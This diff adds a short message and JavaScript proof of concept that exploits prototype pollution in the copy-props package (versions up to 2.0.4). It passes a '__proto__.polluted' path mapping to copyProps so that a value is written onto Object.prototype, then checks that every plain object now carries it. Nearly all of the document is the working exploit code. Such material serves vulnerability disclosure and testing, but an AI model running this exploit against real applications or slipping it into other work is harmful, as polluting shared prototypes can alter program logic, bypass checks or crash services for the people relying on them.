@@ -1,0 +1,19 @@
+Confirmed prototype pollution — `Object.prototype.polluted` gets set, affecting every object. Here's the exploit:
+
+```javascript
+const copyProps = require("./node_modules/copy-props");
+
+// copy-props (<=2.0.4) resolves dotted "to" paths via a naive
+// path.split('.') walk that never blocks "__proto__" segments,
+// letting an attacker-controlled fromto mapping write straight
+// onto Object.prototype (CVE: prototype pollution in copy-props).
+
+const src = { a: "polluted" };
+const dst = {};
+
+copyProps(src, dst, { a: "__proto__.polluted" });
+
+// Every plain object in the process is now polluted.
+console.log("Object.prototype.polluted:", ({}).polluted);
+console.log("attack succeeded:", ({}).polluted === "polluted");
+```
